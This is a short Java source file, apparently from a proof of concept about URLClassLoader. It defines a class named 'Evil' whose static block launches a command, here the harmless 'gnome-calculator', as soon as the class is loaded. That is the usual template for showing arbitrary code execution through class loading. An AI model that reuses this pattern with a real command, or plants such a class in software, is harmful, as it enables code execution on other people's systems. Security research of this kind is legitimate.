package URLClassLoaderPoC;

import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
